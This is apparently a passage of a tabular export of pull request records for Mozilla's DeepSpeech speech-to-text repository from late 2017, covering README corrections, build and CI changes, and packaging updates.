Also, on Debian-derived systems there is a package `git-lfs` which makes it unnecessary to install Git Large File System manually.",dwks,713495,2017-12-13T18:12:56Z,CONTRIBUTOR,True,2,2,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,2af3c2013c1584272196252959b098ef7cde4d5a,Clarify a Python 2.7 (not Python 3) virtualenv.
3359,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1103,1103,Match filenames in release 0.1.0 (output_graph.pb).,"If you run the original commands in the README, with the sample audio files, you get a segfault:

```
$ deepspeech models/output_graph.pb audio/2830-3980-0043.wav models/alphabet.txt models/lm.binary models/trie
Loading model from file models/output_model.pb
Not found: models/output_model.pb; No such file or directory
Loaded model in 0.001s.
Loading language model from files models/lm.binary models/trie
Loaded language model in 0.816s.
Running inference.
Segmentation fault
```

Fortunately the cause is simple, the README referred to models/output_model.pb, while the actual filename in deepspeech-0.1.0-models.tar.gz is models/output_graph.pb. It confused me for a moment at first since I thought the model might well be separate from the graph. Also, perhaps deepspeech should exit more gracefully in this case. It's probably just a NULL pointer check. Cheers.",dwks,713495,2017-12-13T17:59:33Z,CONTRIBUTOR,False,4,4,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,914f7efef728b80550c9fcd55e00eebd6775c9d1,Match filenames in release 0.1.0 (output_graph.pb).
3360,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1102,1102,taskcluster.py: create target dir if not exists,Create target dir if not exists to prevent downloading error,farwayer,2343101,2017-12-13T11:27:13Z,CONTRIBUTOR,True,6,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,bfca43d9285737052708c55a478ee3ca6bacb37d,taskcluster.py: create target dir if not exists
3361,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1098,1098,[Docs] Add Golang third party bindings,"Hey guys,

I've implemented some Golang bindings for your awesome library. Could be useful to let developers know about it so that they can start working with your library quicker if their preferred language is Go.

Cheers",asticode,11619296,2017-12-12T13:43:21Z,CONTRIBUTOR,True,1,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0327fc9fc2c70138a94057a4484406854753b2f8,Added golang third party bindings
3362,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1096,1096,Trigger a new build,,lissyx,1645737,2017-12-11T20:51:43Z,COLLABORATOR,True,0,0,0,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f13bbcc3912ca61a0cd4c16b4a82c8181b3d4d92,Trigger a new build
3363,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1093,1093,for test,,tlchenshao,34158882,2017-12-11T14:37:01Z,NONE,False,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,57b4c6d0e17d60641a55045c14309c50633a5818,for test
3364,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1092,1092,Test proper RPi3 build,,lissyx,1645737,2017-12-11T01:37:01Z,COLLABORATOR,False,10,10,10,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,aa8d956418c2bca36cd5fdf402e5b4d6c456c5f2,Test proper RPi3 build
3365,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1088,1088,[Docs] Renames output_model.pb to output_graph.pb in README,This change aligns command line examples with the content of provided pre-traned models and allows to run it out of box.,wgent,2558661,2017-12-10T18:23:46Z,CONTRIBUTOR,True,4,4,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e681e9c681e57df2b8fc5ab74b7417da52e90461,"Renames output_model.pb to output_graph.pb 

This change aligns command lines examples with the content of provided pre-traned models and allows to run it out of box."
3366,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1086,1086,Update README.md,,gonimar,756571,2017-12-08T16:17:08Z,CONTRIBUTOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4b688a0202eae76c3e0924d2fc27a2b5d4402c7a,Update README.md
3367,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1085,1085,Add missing libtensorflow_framework.so,,lparam,657233,2017-12-08T02:42:16Z,CONTRIBUTOR,True,2,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b0aa0043dd247c7bf38958efbb633521fe49c8c3,Add missing libtensorflow_framework.so
3368,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1080,1080,Remove OSX-specific wget/gunzip hack,Fixes #1079,lissyx,1645737,2017-12-06T13:39:22Z,COLLABORATOR,True,0,6,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,35c6cab0d12eb9316b554f738c60fa4945db59fd,"Remove OSX-specific wget/gunzip hack

Fixes #1079"
3369,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1077,1077,"Update readme, Describe how to download pre-trained models",,mikehenrty,635365,2017-12-06T01:19:13Z,CONTRIBUTOR,True,29,6,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,bfd0e1da9f4a470080d8d3b96f7b016725bdd161,"Describe how to download pre-trained models

The examples given in the README that you could copy-paste didn't work, because they didn't show how to download the pre-trained speech-to-text model. When you tried to run them you would get something like:

```
$ deepspeech output_model.pb ~/Desktop/testing.wav alphabet.txt
Loading model from file output_model.pb
Not found: output_model.pb; No such file or directory
Loaded model in 0.006s.
Running inference.
Segmentation fault
```

I've added some wget and tar commands to actually get the required trained models, so that a person starting with only pip and other standard Unix tools (plus a sound recorder) can actually get speech-to-text to happen."
3370,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1077,1077,"Update readme, Describe how to download pre-trained models",,mikehenrty,635365,2017-12-06T01:19:13Z,CONTRIBUTOR,True,29,6,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a1153ee334e4583c38ad899daf2cb639a143342c,"Add downloading model section, and link to that throughout, closes #1063, fixes #1076"
3371,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1074,1074,"[Docs] - README.md - minor attempt at improving language, adding thumbnail images","### [Docs] - README.md - minor attempt at improving language

<sub><b>This PR does basically aim at:</b></sub>:
- <sub>*attempting at fixing minor issues with language*</sub>
- <sub>*adding thumbnail images*</sub>

---

<sub>**main reason behind such:**</sub>
- <sub>*improving overall document accessebility*</sub>

---


<sub>***LET'S MAKE THE WEB BETTER BIT BY BIT***</sub>
<sub>***EVER TRIED. EVER FAILED. NO MATTER. TRY AGAIN. FAIL AGAIN. FAIL BETTER***</sub>

---

<img src=""https://orig00.deviantart.net/5b95/f/2016/070/3/b/mit_license_logo_by_excaliburzero-d9ur2lg.png"" width=""70""></img> <img src=""https://pbs.twimg.com/profile_images/821735271049768960/jJZXlJwZ.jpg"" width=""50""></img>",ghost,10137,2017-12-05T16:51:03Z,NONE,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,566f744677498c684e49b05ccaa00df23613e0d1,"[Docs] - README.md - minor attempt at improving language

### [Docs] - README.md - minor attempt at improving language

<sub><b>This PR does basically aim at:</b></sub>:
- <sub>*attempting at fixing minor issues with language*</sub>

---

<sub>**main reason behind such:**</sub>
- <sub>*improving overall document accessebility*</sub>

---


<sub>***LET'S MAKE THE WEB BETTER BIT BY BIT***</sub>
<sub>***EVER TRIED. EVER FAILED. NO MATTER. TRY AGAIN. FAIL AGAIN. FAIL BETTER.***</sub>

---

<img src=""https://orig00.deviantart.net/5b95/f/2016/070/3/b/mit_license_logo_by_excaliburzero-d9ur2lg.png"" width=""70""></img> <img src=""https://pbs.twimg.com/profile_images/821735271049768960/jJZXlJwZ.jpg"" width=""50""></img>"
3372,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1074,1074,"[Docs] - README.md - minor attempt at improving language, adding thumbnail images","### [Docs] - README.md - minor attempt at improving language

<sub><b>This PR does basically aim at:</b></sub>:
- <sub>*attempting at fixing minor issues with language*</sub>
- <sub>*adding thumbnail images*</sub>

---

<sub>**main reason behind such:**</sub>
- <sub>*improving overall document accessebility*</sub>

---


<sub>***LET'S MAKE THE WEB BETTER BIT BY BIT***</sub>
<sub>***EVER TRIED. EVER FAILED. NO MATTER. TRY AGAIN. FAIL AGAIN. FAIL BETTER***</sub>

---

<img src=""https://orig00.deviantart.net/5b95/f/2016/070/3/b/mit_license_logo_by_excaliburzero-d9ur2lg.png"" width=""70""></img> <img src=""https://pbs.twimg.com/profile_images/821735271049768960/jJZXlJwZ.jpg"" width=""50""></img>",ghost,10137,2017-12-05T16:51:03Z,NONE,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0a9f590013a4357e42972803b796c01f1f06f8ea,"removing images from thumbnail

removing images from thumbnail"
3373,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1073,1073,Add OSX testing,Fixes #1072,lissyx,1645737,2017-12-05T15:39:50Z,COLLABORATOR,True,346,36,23,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5fdd77d24e2ecd39a2ee1a92c430259a7eb5fd7a,"Add OSX testing

Fixes #1072"
3374,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1071,1071,Improve OSX linkage,Fixes #1051,lissyx,1645737,2017-12-05T10:05:50Z,COLLABORATOR,True,17,0,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,8661d482c8e1f4128362d7757017fd99f8e6c563,"Improve OSX linkage

Fixes #1051"
3375,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1070,1070,Update TOC in README.md.,,qin,416060,2017-12-05T04:00:30Z,CONTRIBUTOR,True,2,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,666021663d97d6adaee0bc2a34010a7bf0b350ce,Update TOC in README.md.
3376,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1070,1070,Update TOC in README.md.,,qin,416060,2017-12-05T04:00:30Z,CONTRIBUTOR,True,2,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,df89a8f025471c55774c807963cbfb78ed298f41,Update README.md
3377,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1069,1069,Remove unused local_tf folder,,reuben,477142,2017-12-04T17:54:58Z,MEMBER,True,0,1233,13,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5f48f990a35cb55fb1576c066c8217f2a3a95334,Remove unused local_tf folder
3378,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1067,1067,Remove scipy 0.19.1 hard-requirement,,lissyx,1645737,2017-12-04T10:23:43Z,COLLABORATOR,True,2,2,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3c7bfec840b322ef1f21305f5bcae987a1482569,Remove scipy 0.19.1 hard-requirement
3379,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1065,1065,Set minimum OSX version to 10.10,Fixes #1055,lissyx,1645737,2017-12-04T09:24:09Z,COLLABORATOR,True,1,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e0a96ef7518c2f4c9fcb4945b882c4d27f44a20f,"Set minimum OSX version to 10.10

Fixes #1055"
3380,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1063,1063,Describe how to download pre-trained models,"The examples given in the README that you could copy-paste didn't work, because they didn't show how to download the pre-trained speech-to-text model. When you tried to run them you would get something like:

```
$ deepspeech output_model.pb ~/Desktop/testing.wav alphabet.txt
Loading model from file output_model.pb
Not found: output_model.pb; No such file or directory
Loaded model in 0.006s.
Running inference.
Segmentation fault
```

I've added some wget and tar commands to actually get the required trained models, so that a person starting with only pip and other standard Unix tools (plus a sound recorder) can actually get speech-to-text to happen.",interfect,752054,2017-12-03T23:03:43Z,CONTRIBUTOR,False,32,4,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6dbbd5888f2aae39ee93c0a4690464297a2e2eff,"Describe how to download pre-trained models

The examples given in the README that you could copy-paste didn't work, because they didn't show how to download the pre-trained speech-to-text model. When you tried to run them you would get something like:

```
$ deepspeech output_model.pb ~/Desktop/testing.wav alphabet.txt
Loading model from file output_model.pb
Not found: output_model.pb; No such file or directory
Loaded model in 0.006s.
Running inference.
Segmentation fault
```

I've added some wget and tar commands to actually get the required trained models, so that a person starting with only pip and other standard Unix tools (plus a sound recorder) can actually get speech-to-text to happen."
3381,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1062,1062,Fix typo in packaging script (fixes #1061),,reuben,477142,2017-12-03T22:00:53Z,MEMBER,True,2,2,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,89e4eb8ed82cb52b50448976bc16fc474f6005d4,Fix typo in packaging script
3382,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1060,1060,Fixed #1059,,kdavis-mozilla,12054740,2017-12-03T16:45:08Z,CONTRIBUTOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,db7063ae07e2fcb60951f299392998444128e33e,Fixed #1059
3383,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1054,1054,Test training with multiple Python versions,Fixes #970,lissyx,1645737,2017-12-01T15:28:54Z,COLLABORATOR,True,122,45,48,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,fb456da394876ef7f839bfe8263012dc3a6b12a2,"Test training with multiple Python versions

Fixes #970"
3384,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1053,1053,Using custom IRC notifications,X-DeepSpeech: NOBUILD,lissyx,1645737,2017-12-01T14:13:33Z,COLLABORATOR,False,7,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,adb4dc97f898f2a6d9efe8c758c28489a08fe864,"Using custom IRC notifications

X-DeepSpeech: NOBUILD"
3385,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1052,1052,corrected typos,"folllows -> follows
dendencies -> dependencies",bhageena,14236753,2017-12-01T13:56:32Z,CONTRIBUTOR,True,2,2,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5bb33de117c4ca92dd8cdde458bd88c154da9665,"corrected typos

folllows -> follows
dendencies -> dependencies"
3386,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1049,1049,Update README.md for r1.4-based,X-DeepSpeech: NOBUILD,lissyx,1645737,2017-12-01T11:46:34Z,COLLABORATOR,True,4,4,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f2ae05d729d74c9f0885e91c639f8eb2ee243a9e,"Update README.md for r1.4-based

X-DeepSpeech: NOBUILD"
3387,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1048,1048,Fixes typo in Installing Python bindings block,"Trivial, fixes typo in Installing DeepSpeech Python bindings block.",techiev2,279719,2017-12-01T09:38:11Z,CONTRIBUTOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,38d7081249ef24f14f8d36a270709bf7694438eb,Fixes typo in Installing Python bindings block
3388,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1044,1044,Adding note about audio file format requirements.,This is current until #1022 is resolved.,JanX2,192294,2017-11-30T14:24:07Z,CONTRIBUTOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d5082b4550177949bb7bee138c05bed20d0021cf,"Adding note about audio file format requirements.

This is current until #1022 is resolved."
3389,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1043,1043,Switch to JSON-e fixes version,X-DeepSpeech: NOBUILD,lissyx,1645737,2017-11-30T08:34:08Z,COLLABORATOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d06735c93303a720ac54f5982be1cfaaada47178,"Switch to JSON-e fixed version

X-DeepSpeech: NOBUILD"
3390,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1042,1042,Local patch SWIG 3.0 with PR #968,,lissyx,1645737,2017-11-29T16:20:06Z,COLLABORATOR,True,700,3,21,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,79d381f1b9a8eab7b3efd1fb7505bab78b16e34d,"Patch SWIG locally with PR #968

Fixes #911"
3391,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1041,1041,Scriptworker task changes for NPM support,,reuben,477142,2017-11-29T00:30:01Z,MEMBER,True,19,8,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,83f3258751ab833b1df8c92d47c9e97554c09290,"Separate Python and JS artifacts_deps

X-DeepSpeech: NOBUILD"
3392,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1041,1041,Scriptworker task changes for NPM support,,reuben,477142,2017-11-29T00:30:01Z,MEMBER,True,19,8,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,8c32d85ad33d1e21652e0461b78c402ac83eef41,"Add Node package task as dependency of scriptworker task

X-DeepSpeech: NOBUILD"
3393,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1041,1041,Scriptworker task changes for NPM support,,reuben,477142,2017-11-29T00:30:01Z,MEMBER,True,19,8,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f7487a79d3fa967bd5ed32f27ffc73f92ff7dae9,"Address review comments

X-DeepSpeech: NOBUILD"
3394,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1040,1040,Issue1039,Fixed #1039 ,kdavis-mozilla,12054740,2017-11-28T16:16:59Z,CONTRIBUTOR,True,0,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d1e2af98fc4bcf2599ca90086c6c1b85ac0a38ac,Fixed #1039
3395,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1040,1040,Issue1039,Fixed #1039 ,kdavis-mozilla,12054740,2017-11-28T16:16:59Z,CONTRIBUTOR,True,0,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,afb67aed98b34da993fd30790c1b3004d8a98b71,Compressed gif
3396,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1038,1038,Fixed #1037,,kdavis-mozilla,12054740,2017-11-28T13:26:39Z,CONTRIBUTOR,True,0,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e51b494f72525a83406980de7ed256073e716219,Fixed #1037
3397,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1038,1038,Fixed #1037,,kdavis-mozilla,12054740,2017-11-28T13:26:39Z,CONTRIBUTOR,True,0,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4973d1b1049f44bd42484284cf020da937e576ce,Remvoed GPU added CPU
3398,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1036,1036,Adding build-inhibition handling,,lissyx,1645737,2017-11-28T12:11:08Z,COLLABORATOR,True,7,2,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e5d31be423be2fb48ffc4ec1d75d3c6e9d5e9783,"Adding build-inhibition handling

Fixes #1035

X-DeepSpeech: NOBUILD"
3399,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1034,1034,Fixed #1033,,kdavis-mozilla,12054740,2017-11-28T10:04:06Z,CONTRIBUTOR,True,8,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,bb7621c8873ef8a53adfc7923630d68c80cb729e,Fixed #1033
3400,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1031,1031,Create an issue template,I shamelessly stole most of it from the TensorFlow issue template.,reuben,477142,2017-11-27T18:41:26Z,MEMBER,True,24,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f1bb852a5ee524c705366ba841c0de77c7fbdb9a,Create an issue template
3401,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1029,1029,Fixed #1028,,kdavis-mozilla,12054740,2017-11-27T15:58:43Z,CONTRIBUTOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5a7f7fa7d050d22e8be6ef808c8068b905404935,Fixed #1028
3402,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1029,1029,Fixed #1028,,kdavis-mozilla,12054740,2017-11-27T15:58:43Z,CONTRIBUTOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7c9f5815c81edce8ff487589111357f8131f6a07,Added period
3403,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1027,1027,Document deps,Fixes #1025,lissyx,1645737,2017-11-27T14:08:51Z,COLLABORATOR,True,11,1,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,031addd5c8c020f6b2bbfbdb249f24b22ba2c84b,"Document deps

Fixes #1025"
3404,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1026,1026,Add CUDA test coverage,Fixes #1021,lissyx,1645737,2017-11-27T10:21:53Z,COLLABORATOR,False,92,0,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,51ee1202436d835143e6ab937f101b94c2031812,"Add CUDA test coverage

Fixes #1021"
3405,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1020,1020,Better resuming; additional README content; small improvements,,tilmankamp,5991088,2017-11-24T14:41:34Z,CONTRIBUTOR,True,97,62,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,aeada86709f52627f036ad3b1f8462b0e0ad2a94,Better resuming; additional README content; small improvements
3406,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1019,1019,Switch version number to 0.1.0,,reuben,477142,2017-11-24T13:58:36Z,MEMBER,True,9,9,8,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,014d0c72739b632f7bb4172b2f14e203013c5f68,Switch version number to 0.1.0
3407,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1018,1018,Add v0.0.3 branch to filtering,,lissyx,1645737,2017-11-24T11:25:41Z,COLLABORATOR,True,4,0,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9b28eb36aebf02765ac6024d413819e697e3d0b9,Add branch filtering for tags
3408,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1015,1015,Trigger TaskCluster tasks on new tag/release,"Not sure how to test this other than merging and doing the release, though :P",reuben,477142,2017-11-23T20:19:51Z,MEMBER,False,4,2,4,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9217daf450e039e7a8ee9fa72229002d2a4d1738,Trigger TaskCluster tasks on new tag/release
3409,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1014,1014,Update docs to point to published Node packages,,reuben,477142,2017-11-23T18:03:20Z,MEMBER,True,11,4,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e8452b896fe007b73a999e895b0fe1cccb33b650,Update docs to point to published Node packages
3410,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1013,1013,Switch to v0.0.3,,lissyx,1645737,2017-11-23T15:35:35Z,COLLABORATOR,True,14,12,10,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c95a1daab95f00ae4d4b5f4459d7af40671f8801,Switch to v0.0.3
3411,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1012,1012,Common Voice importer,,tilmankamp,5991088,2017-11-23T15:33:00Z,CONTRIBUTOR,True,176,0,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1e54ab86107ef9639e6f0f3d7cf3d024acf28650,Common Voice importer
3412,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1011,1011,Add runtime execution time feedback,Fixes #1010,lissyx,1645737,2017-11-23T10:44:40Z,COLLABORATOR,True,36,0,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4573187ac5fd213f27299cc8c3fc304a1411d5c0,"Add runtime execution time feedback

Fixes #1010"
3413,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1009,1009,"Revert ""Update docs to point to npm packages""",Reverts mozilla/DeepSpeech#1008,reuben,477142,2017-11-22T15:35:40Z,MEMBER,True,4,11,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5ba46cc2daf574ecdd0264fc0846d9d4d65be682,"Revert ""Update docs to point to npm packages"""
3414,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1008,1008,Update docs to point to npm packages,,reuben,477142,2017-11-22T15:08:23Z,MEMBER,True,11,4,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a84bbb40bfa6f68d98132008eb4a4a309ed267d5,Update docs to point to npm packages
3415,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1008,1008,Update docs to point to npm packages,,reuben,477142,2017-11-22T15:08:23Z,MEMBER,True,11,4,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,570ba7db576641a3c33c899baec2a450385b2606,Address review comments
3416,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1007,1007,Provide a deepspeech binary based on NodeJS,Fixes #1006,lissyx,1645737,2017-11-22T14:19:12Z,COLLABORATOR,True,41,50,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7f41fc3f0c787dd9510287075ca13273e092b094,"Provide a deepspeech binary based on NodeJS

Fixes #1006"
3417,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1005,1005,Ensure _model.so and _utils.so are inside DeepSpeech package,Fixes #1001,lissyx,1645737,2017-11-22T13:49:23Z,COLLABORATOR,True,4,3,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,226dbff0be00e220e4890c7d3968582ec63eaad1,"Ensure _model.so and _utils.so are inside DeepSpeech package

Fixes #1001"
3418,https://api.github.com/repos/mozilla/DeepSpeech/pulls/1004,1004,Fixed #990 and Fixed #989,"Fixed #990 and Fixed #989 

